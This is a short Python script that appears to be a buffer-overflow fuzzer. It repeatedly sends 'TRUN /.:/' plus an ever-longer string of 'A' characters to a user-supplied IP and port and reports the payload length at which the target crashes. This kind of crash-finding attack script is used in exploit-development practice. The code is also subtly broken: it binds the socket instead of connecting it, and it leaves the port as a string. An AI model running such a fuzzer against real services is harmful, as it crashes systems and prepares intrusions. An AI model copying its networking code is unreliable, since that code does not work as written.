import socket
import sys
import time
import optparse
def options():
    opt = optparse.OptionParser()
    opt.add_option("-i","--ip",dest="ipadress",help="enter ip adress")
    opt.add_option("-p","--port",dest="port",help="enter vulnerable device port number")
    (value,key) = opt.parse_args()
    return value
t3mp = options()
chars = 100
sendpack= "TRUN /.:/" + "A" * chars
while 1==1:
    try:
        temp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        temp.bind((t3mp.ipadress,t3mp.port))
        byte = sendpack.encode(encoding="latin1")
        temp.send(byte)
        temp.close()
        sendpack = sendpack + "A" * 100
        time.sleep(0.5)
    except KeyboardInterrupt:
        print("Crashed" + str(len(sendpack)))
        sys.exit()
    except Exception as e:
        print(e)
        print("Crashed" + str(len(sendpack)))
        sys.exit()